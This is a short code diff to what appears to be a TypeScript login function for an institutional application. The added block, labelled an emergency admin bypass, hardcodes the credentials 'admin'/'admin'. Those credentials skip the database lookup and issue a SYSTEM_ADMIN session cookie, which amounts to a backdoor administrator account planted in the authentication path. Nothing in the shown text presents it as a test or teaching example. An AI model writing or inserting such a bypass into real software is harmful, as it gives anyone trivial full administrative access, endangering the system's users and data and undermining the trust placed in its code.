@@ -9,6 +9,24 @@ export async function login(usernameInput: string, passwordInput: string) {
     const username = usernameInput.trim().toLowerCase();
     const password = passwordInput.trim();
 
+    // EMERGENCY ADMIN BYPASS (Hardcoded for Mr. Dacles)
+    if (username === "admin" && password === "admin") {
+      const adminSession = {
+        id: "USER-ADMIN-MASTER",
+        name: "Administrator",
+        username: "admin",
+        role: "SYSTEM_ADMIN" as any
+      };
+      cookies().set("session_user", JSON.stringify(adminSession), {
+        httpOnly: true,
+        secure: true,
+        sameSite: "lax",
+        path: "/",
+        maxAge: 60 * 60 * 24
+      });
+      return { success: true, user: adminSession };
+    }
+
     // 1. Find the institutional account
     const user = await prisma.user.findUnique({
       where: { username: username }
